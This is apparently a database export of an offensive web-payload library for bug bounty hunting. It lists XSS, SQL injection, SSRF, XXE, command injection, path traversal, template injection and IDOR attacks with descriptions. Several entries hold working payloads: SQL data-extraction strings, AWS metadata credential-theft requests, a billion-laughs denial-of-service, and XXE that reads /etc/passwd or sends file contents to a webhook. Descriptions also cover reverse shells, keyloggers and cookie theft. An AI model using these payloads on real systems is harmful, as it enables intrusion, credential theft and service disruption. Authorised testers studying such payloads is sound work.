categories.name: XSS
categories.description: Cross-Site Scripting payloads including modern WAF bypasses and exfiltration techniques

categories.name: SQL Injection
categories.description: SQL Injection payloads for various database types and injection contexts

categories.name: SSRF
categories.description: Server-Side Request Forgery payloads targeting cloud metadata and internal networks

categories.name: XXE
categories.description: XML External Entity payloads for file disclosure and out-of-band exfiltration

categories.name: Command Injection
categories.description: OS Command Injection payloads with exfiltration and reverse shell capabilities

categories.name: Path Traversal
categories.description: Directory traversal payloads with encoding and filter bypass techniques

categories.name: SSTI
categories.description: Server-Side Template Injection payloads for various template engines

categories.name: IDOR
categories.description: Insecure Direct Object Reference patterns for authorization bypass

payloads.name: Modern WAF Bypass - SVG Onload
payloads.description: Minimal SVG-based XSS that bypasses many WAF filters by using self-closing tags. Works on WAFs that don't properly parse SVG tags.

payloads.name: Cloudflare WAF Bypass - Decimal Encoding
payloads.description: Uses 8+ superfluous leading zeros in decimal encoding to bypass Cloudflare's character encoding checks. Source: HackerOne Report #1615743

payloads.name: Blind XSS with Webhook Exfiltration
payloads.description: Exfiltrates cookies, domain, and current URL to attacker webhook for blind XSS detection. Use with XSS Hunter or custom webhook services.

payloads.name: DOM-Based XSS - localStorage Theft
payloads.description: Steals JWT tokens or API keys stored in localStorage. Particularly effective against SPA applications.

payloads.name: Keylogger XSS Payload
payloads.description: Captures all keystrokes and sends them to attacker webhook. Demonstrates high impact for bug bounty reports.

payloads.name: Double Encoded Non-Printable Characters
payloads.description: Double URL encoding breaks many WAF filters that only decode once. Source: Starbucks HackerOne Report #716761

payloads.name: AngularJS Template Injection
payloads.description: Bypasses AngularJS sandbox in versions <1.6. Still relevant for legacy Angular applications.

payloads.name: Prototype Pollution to XSS
payloads.description: Exploits prototype pollution vulnerability to inject XSS via object properties. Works on applications vulnerable to prototype pollution.

payloads.name: Script Gadget with DOMPurify Bypass
payloads.description: Bypasses DOMPurify sanitization using mXSS mutation. Source: Research from Cure53

payloads.name: Mutation XSS - Backslash Newline
payloads.description: Uses backslash-newline to create mutations that bypass sanitizers. Effective against innerHTML-based sanitization.

payloads.name: CSP Bypass - JSONP Endpoint
payloads.description: Bypasses Content Security Policy by leveraging trusted domain's JSONP endpoint. Find JSONP on whitelisted domains.

payloads.name: Service Worker XSS Persistence
payloads.description: Registers malicious service worker for persistent XSS. Service worker intercepts all page requests even after refresh.

payloads.name: Unicode Normalization XSS
payloads.description: Uses Unicode escape sequences to bypass filters. Some WAFs normalize Unicode differently than browsers.

payloads.name: HTML Injection to XSS via Meta Refresh
payloads.description: Escalates HTML injection to XSS using meta refresh redirect. Works when script tags are blocked.

payloads.name: XSS via SVG ForeignObject
payloads.description: Embeds HTML inside SVG via foreignObject element. Bypasses filters that allow SVG but block HTML script tags.

payloads.name: Time-Based Blind SQLi - MySQL
payloads.description: Forces 5-second delay if condition is true, confirming SQL injection. Increase sleep time for unreliable networks.

payloads.name: Boolean-Based Blind SQLi
payloads.content: ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)-- -
payloads.description: Returns different responses based on condition truth, enabling data extraction. Works across multiple database types.

payloads.name: UNION-Based SQLi with NULL Probing
payloads.description: Extracts user credentials by matching column count and positions. Adjust NULL count to match original query columns.

payloads.name: Out-of-Band SQLi with Webhook
payloads.description: MSSQL payload that exfiltrates database version via DNS/HTTP to webhook. Requires xp_dirtree to be enabled.

payloads.name: PostgreSQL Error-Based SQLi
payloads.description: Forces error message containing database version in response. Replace version() with any query for data extraction.

payloads.name: MySQL Load File with UNC Path
payloads.description: Forces MySQL to make SMB connection to attacker server, exfiltrating NTLM hashes. Only works on Windows MySQL installations.

payloads.name: Time-Based Blind - MSSQL
payloads.description: Conditional 5-second delay reveals if current user is 'sa' (admin). Modify user check to enumerate permissions.

payloads.name: SQLi Polyglot Payload
payloads.content: SLEEP(1) /*' or SLEEP(1) or "' or SLEEP(1) or "*/
payloads.description: Works across multiple injection contexts (single quote, double quote, no quote). Source: PayloadsAllTheThings

payloads.name: Stacked Queries - PostgreSQL
payloads.description: Executes multiple SQL statements in one query. PostgreSQL and MSSQL support stacked queries by default.

payloads.name: NoSQL Injection - MongoDB
payloads.description: Bypasses authentication in MongoDB by using $ne (not equal) operator. Returns first user where both fields exist.

payloads.name: SQLi in ORDER BY Clause
payloads.description: Exploits SQL injection in ORDER BY parameter. Many developers don't sanitize sort parameters.

payloads.name: SQLMap Tamper Script Bypass
payloads.content: ' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -
payloads.description: Character-by-character extraction using ASCII comparison. Automatable with SQLMap's --technique=B flag.

payloads.name: WAF Bypass - Comment Injection
payloads.description: Uses MySQL version-specific comments to bypass WAF keyword filtering. /*!50000*/ executes only on MySQL 5.0+

payloads.name: Second Order SQLi Payload
payloads.content: admin'-- (stored) → Triggers on: SELECT * FROM users WHERE username='admin'--'
payloads.description: Malicious payload stored in database, triggered later in different query. Hard to detect with automated scanners.

payloads.name: SQLi via HTTP Headers
payloads.description: Exploits SQL injection in HTTP header processing (X-Forwarded-For, User-Agent, Referer). Often overlooked in security testing.

payloads.name: AWS EC2 Metadata Extraction (IMDSv1)
payloads.description: Retrieves AWS IAM credentials from EC2 instance metadata service. Note: IMDSv2 requires token-based authentication.

payloads.name: AWS IMDSv2 Token-Based Access
payloads.content:
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

Then: GET /latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <token>
payloads.description: Bypasses IMDSv2 protection by first obtaining session token. Many applications don't properly restrict PUT methods.

payloads.name: GCP Metadata with Header Bypass
payloads.description: Retrieves GCP OAuth token. Requires 'Metadata-Flavor: Google' header - often forgotten in WAF rules.

payloads.name: Azure Instance Metadata Service
payloads.description: Extracts Azure VM metadata including managed identity tokens. Requires api-version parameter and 'Metadata: true' header.

payloads.name: DNS Exfiltration via SSRF
payloads.description: Exfiltrates data through DNS subdomain in attacker-controlled domain. Works even when HTTP responses are not returned.

payloads.name: Internal Network Port Scanning
payloads.description: Scans internal network for common services via SSRF. Response timing differences reveal open ports.

payloads.name: SSRF via Webhook Feature
payloads.description: Exploits webhook registration endpoints to trigger SSRF. Source: HackerOne Report #508459 - Omise

payloads.name: Localhost Bypass with IPv6
payloads.description: Bypasses localhost blacklists using IPv6 notation. Many filters only check IPv4 addresses.

payloads.name: SSRF via PDF Generator
payloads.description: Exploits HTML-to-PDF conversion to trigger SSRF. PDF generators often fetch external resources without validation.

payloads.name: Redis Exploitation via SSRF
payloads.description: Uses Gopher protocol to send Redis commands via SSRF. Can write webshell or create SSH keys. Requires Gopher support.

payloads.name: SSRF to RCE via Memcached
payloads.description: Writes PHP backdoor to Memcached via SSRF, then accesses via application cache mechanism.

payloads.name: Blind SSRF with Time Delay
payloads.description: Detects blind SSRF by observing response time differences. Useful when no response content is returned.

payloads.name: Kubernetes Service Account Token Theft
payloads.description: Accesses Kubernetes API from within cluster to steal service account tokens. Works from pods with network access.

payloads.name: SSRF via SVG Image Processing
payloads.description: Triggers SSRF via SVG image href attribute. Image processing libraries often fetch external resources.

payloads.name: Basic XXE File Disclosure
payloads.description: Reads /etc/passwd file and includes content in XML response. Works when XML parser has external entities enabled.

payloads.name: Blind XXE with OOB Exfiltration
payloads.description: Two-stage blind XXE that exfiltrates files via external DTD. Host xxe.dtd with: <!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://{{WEBHOOK_URL}}/?data=%file;'>">%eval;%exfil;

payloads.name: XXE to SSRF (AWS Metadata)
payloads.description: Leverages XXE to perform SSRF and steal AWS credentials. Combines two vulnerability types for higher impact.

payloads.name: XXE with PHP Wrapper
payloads.description: Uses PHP wrapper to base64-encode file content, bypassing XML parsing issues. Prevents XML parser errors from binary files.

payloads.name: XXE Billion Laughs DoS
payloads.content: <?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><lolz>&lol4;</lolz>
payloads.description: Exponential entity expansion causes memory exhaustion and DoS. Source: PortSwigger Web Security Academy

payloads.name: XXE via SVG Upload
payloads.description: Exploits XXE through SVG file upload. SVG files are XML-based and often processed without proper sanitization.

payloads.name: XXE in SOAP Request
payloads.description: Targets SOAP web services which are XML-based. Legacy SOAP services often have XXE vulnerabilities.

payloads.name: XXE via Microsoft Office Document
payloads.description: Embeds XXE payload in Office document (docx, xlsx). Triggers when document is processed server-side.

payloads.name: Blind XXE via Error Messages
payloads.content: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;]><foo/>
payloads.description: Exfiltrates file content through XML parser error messages. Works when DTD is processed inline.

payloads.name: XXE via XInclude
payloads.description: Uses XInclude to read files when you can't modify DOCTYPE. Works in XML fragments or when DOCTYPE is not user-controlled.

payloads.name: XXE Parameter Entity Injection
payloads.description: Uses parameter entities for blind XXE attacks. More reliable than regular entities in some parsers.

payloads.name: XXE via XLSX Formula Injection
payloads.description: Combines XXE with Excel formula injection. When XLSX is parsed server-side, external requests are made.

payloads.name: Linux Command Chaining with Exfiltration
payloads.description: Executes whoami command and exfiltrates base64-encoded result to webhook. Base64 encoding prevents special characters from breaking URL.

payloads.name: Reverse Shell - Bash
payloads.description: Creates interactive reverse shell connection to attacker. Replace ATTACKER_IP with your listener IP. Set up listener: nc -lvnp 4444

payloads.name: Blind Command Injection with DNS
payloads.description: Exfiltrates command output via DNS subdomain query. Works even when HTTP output is blocked.

payloads.name: Time-Based Blind Command Injection
payloads.description: Causes 10-second delay to confirm command execution. Simplest way to detect blind command injection.

payloads.name: Windows PowerShell Download & Execute
payloads.description: Downloads and executes PowerShell payload from attacker server. Common bypass for Windows restrictions.

payloads.name: Filter Bypass with Variable Expansion
payloads.description: Uses $IFS (Internal Field Separator) to bypass space filtering. $IFS expands to space/tab/newline.

payloads.name: Command Injection in JSON API
payloads.description: Exploits command injection in JSON parameter processing. Common in file processing APIs.

payloads.name: Python Reverse Shell
payloads.description: Python-based reverse shell, useful when bash is not available. Works on systems with Python 2 or 3.

payloads.name: Command Injection with Output Redirection
payloads.description: Redirects sensitive file to web-accessible directory. Access via http://target/passwd.txt

payloads.name: Netcat Reverse Shell
payloads.description: Uses netcat for reverse shell. Traditional nc syntax, may not work on newer nc versions without -e flag.

payloads.name: Command Injection via User-Agent
payloads.description: Exploits Shellshock vulnerability (CVE-2014-6271) via User-Agent header. Still found in legacy CGI applications.

payloads.name: Perl Reverse Shell
payloads.description: Perl-based reverse shell, useful when Python and Bash are restricted. Works on most Unix systems.

payloads.name: Command Injection with Backticks
payloads.description: Uses backticks for command substitution. Alternative to $() syntax, works in older shells.

payloads.name: Windows CMD Reverse Shell
payloads.description: Full PowerShell reverse shell for Windows. Bypasses execution policy and runs hidden.

payloads.name: Classic Directory Traversal
payloads.description: Accesses /etc/passwd by traversing up directory tree. Works when input validation is missing.

payloads.name: Null Byte Injection
payloads.description: Uses null byte to truncate extension check and read arbitrary files. Works on older PHP versions (<5.3.4).

payloads.name: Double URL Encoding Bypass
payloads.description: Double encoding bypasses filters that only decode once. %252f decodes to %2f then to /

payloads.name: Nested Traversal Sequence
payloads.description: When inner ../ is stripped, outer sequence remains valid. Source: YesWeHack Path Traversal Guide

payloads.name: Windows Path Traversal
payloads.description: Windows-style path traversal to read hosts file. Backslashes work on Windows servers.

payloads.name: Absolute Path Bypass
payloads.description: Uses absolute path when application expects relative paths. Effective when chroot jail is not implemented.

payloads.name: UNC Path Traversal (Windows NTLM Theft)
payloads.description: Forces Windows server to connect to attacker SMB share, leaking NTLM hash. Combines path traversal with SSRF.

payloads.name: Path Traversal in ZIP Upload (Zip Slip)
payloads.description: Extracts malicious file outside intended directory via ZIP upload. Common vulnerability in archive extraction - CVE-2018-1000559

payloads.name: Mixed Encoding Bypass
payloads.description: Mixes encoded and unencoded characters to bypass pattern matching. Some WAFs only check for fully encoded or fully decoded patterns.

payloads.name: Path Traversal via File Deletion
payloads.description: Uses path traversal in delete endpoints to remove system files. Can cause DoS or security bypass.

payloads.name: Unicode Encoding Bypass
payloads.description: Uses overlong UTF-8 encoding (%c0%af for /) to bypass filters. Works on systems that normalize Unicode after validation.

payloads.name: Path Traversal with Wildcard
payloads.description: Uses wildcards to bypass exact filename matching. Some systems expand wildcards before validation.

payloads.name: Symbolic Link Following
payloads.description: Exploits symbolic link following to access restricted files. Application follows symlink outside intended directory.

payloads.name: Jinja2 RCE - Python/Flask
payloads.description: Executes OS commands through Jinja2 template and exfiltrates output. Works on Flask applications with Jinja2.

payloads.name: Jinja2 Config Disclosure
payloads.description: Dumps Flask configuration including secret keys and database credentials. High-value target for bug bounty reports.

payloads.name: Twig RCE - PHP/Symfony
payloads.description: Registers system() as filter callback and executes commands. Source: YesWeHack SSTI Guide

payloads.name: FreeMarker RCE - Java
payloads.description: Uses FreeMarker's Execute utility to run system commands. Common in Java web applications.

payloads.name: Thymeleaf RCE - Java/Spring
payloads.description: Spring Expression Language (SpEL) injection in Thymeleaf. Works when SpEL evaluation is enabled.

payloads.name: Pug/Jade RCE - Node.js
payloads.description: Executes Node.js child_process to run system commands. Common in Node.js/Express applications.

payloads.name: SSTI Detection Polyglot
payloads.description: Triggers different template engines to reveal which is in use. Source: PortSwigger SSTI Guide

payloads.name: Jinja2 Sandbox Bypass
payloads.description: Uses hex encoding to bypass sandboxed Jinja2 environment. Evades filters that block __globals__, __builtins__, etc.

payloads.name: Velocity RCE - Java
payloads.description: Apache Velocity template injection leading to RCE. Used in older Java applications and CMS systems.

payloads.name: Smarty RCE - PHP
payloads.description: Direct command execution in Smarty template engine. Works when {system} function is not disabled.

payloads.name: ERB RCE - Ruby/Rails
payloads.description: Executes shell commands in Ruby ERB templates. Common in Ruby on Rails applications.

payloads.name: Handlebars Prototype Pollution to RCE
payloads.description: Exploits Handlebars.js prototype pollution to achieve RCE. Source: Handlebars CVE-2021-23383

payloads.name: Tornado Template RCE - Python
payloads.description: Direct module import and command execution in Tornado templates. Works when module imports are allowed.

payloads.name: Sequential ID Enumeration
payloads.description: Increments user IDs to access other users' profiles. Automate with Burp Intruder or custom scripts.

payloads.name: UUID Prediction via Timestamp
payloads.description: UUIDv1 contains timestamp and MAC address, potentially predictable. UUIDv4 is random, but v1 can be reverse-engineered.

payloads.name: GraphQL IDOR
payloads.description: Queries other users' sensitive data through GraphQL resolver. Source: Medium - GraphQL IDOR

payloads.name: Body Parameter Tampering
payloads.description: Modifies user_id in request body to perform actions on other accounts. Test all ID parameters in POST/PUT requests.

payloads.name: Path Parameter Manipulation
payloads.description: Changes document ID in URL path to access other users' files. Common in document management systems.

payloads.name: Cookie-Based IDOR
payloads.description: Modifies user_id in cookie to impersonate other users. Indicates severe authentication flaw.

payloads.name: Wildcard IDOR
payloads.description: Uses wildcard or 'all' parameter to retrieve all resources. Sometimes accidentally left in production APIs.

payloads.name: Hash/Token IDOR
payloads.description: Increments or brute-forces password reset tokens. Effective when tokens are predictable or short.

payloads.name: Numeric ID Wrap-Around
payloads.description: Tests integer boundary values to access special or admin records. Some systems store admin data at special IDs.

payloads.name: GUID Enumeration via Timing
payloads.content: Measure response time for: GET /api/users/valid-guid (fast) vs /api/users/invalid-guid (slower)
payloads.description: Uses timing differences to enumerate valid GUIDs. Valid IDs may trigger database lookups with different response times.

payloads.name: Base64 Encoded ID Manipulation
payloads.description: Decodes base64 ID, increments value, re-encodes. Common obfuscation technique that doesn't provide security.

payloads.name: Multi-Parameter IDOR
payloads.description: Some endpoints check one parameter but not the relationship between multiple IDs. Test all combinations.

payloads.name: Referrer-Based IDOR
payloads.description: Changes referrer header to bypass client-side authorization checks. Server trusts referrer for access control.
